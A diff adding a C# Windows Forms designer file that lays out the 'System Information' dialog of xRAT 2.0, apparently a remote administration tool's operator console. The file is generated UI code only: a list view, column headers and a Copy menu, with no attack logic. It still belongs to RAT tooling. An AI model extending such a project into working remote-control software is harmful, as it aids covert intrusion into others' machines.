@@ -1,0 +1,110 @@
+﻿namespace xRAT_2.Forms
+{
+    partial class frmSystemInformation
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmSystemInformation));
+            this.lstSystem = new xRAT_2.Controls.ListViewEx();
+            this.hComponent = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hValue = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.ctxtMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.ctxtCopy = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtMenu.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // lstSystem
+            // 
+            this.lstSystem.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.hComponent,
+            this.hValue});
+            this.lstSystem.ContextMenuStrip = this.ctxtMenu;
+            this.lstSystem.FullRowSelect = true;
+            this.lstSystem.GridLines = true;
+            this.lstSystem.Location = new System.Drawing.Point(12, 12);
+            this.lstSystem.Name = "lstSystem";
+            this.lstSystem.Size = new System.Drawing.Size(437, 228);
+            this.lstSystem.TabIndex = 0;
+            this.lstSystem.UseCompatibleStateImageBehavior = false;
+            this.lstSystem.View = System.Windows.Forms.View.Details;
+            // 
+            // hComponent
+            // 
+            this.hComponent.Text = "Component";
+            this.hComponent.Width = 172;
+            // 
+            // hValue
+            // 
+            this.hValue.Text = "Value";
+            this.hValue.Width = 242;
+            // 
+            // ctxtMenu
+            // 
+            this.ctxtMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.ctxtCopy});
+            this.ctxtMenu.Name = "ctxtMenu";
+            this.ctxtMenu.Size = new System.Drawing.Size(153, 48);
+            // 
+            // ctxtCopy
+            // 
+            this.ctxtCopy.Image = global::xRAT_2.Properties.Resources.copy;
+            this.ctxtCopy.Name = "ctxtCopy";
+            this.ctxtCopy.Size = new System.Drawing.Size(152, 22);
+            this.ctxtCopy.Text = "Copy";
+            this.ctxtCopy.Click += new System.EventHandler(this.ctxtCopy_Click);
+            // 
+            // frmSystemInformation
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(461, 252);
+            this.Controls.Add(this.lstSystem);
+            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "frmSystemInformation";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "xRAT 2.0 - System Information []";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.frmSystemInformation_FormClosing);
+            this.Load += new System.EventHandler(this.frmSystemInformation_Load);
+            this.ctxtMenu.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ColumnHeader hComponent;
+        private System.Windows.Forms.ColumnHeader hValue;
+        public Controls.ListViewEx lstSystem;
+        private System.Windows.Forms.ContextMenuStrip ctxtMenu;
+        private System.Windows.Forms.ToolStripMenuItem ctxtCopy;
+    }
+}
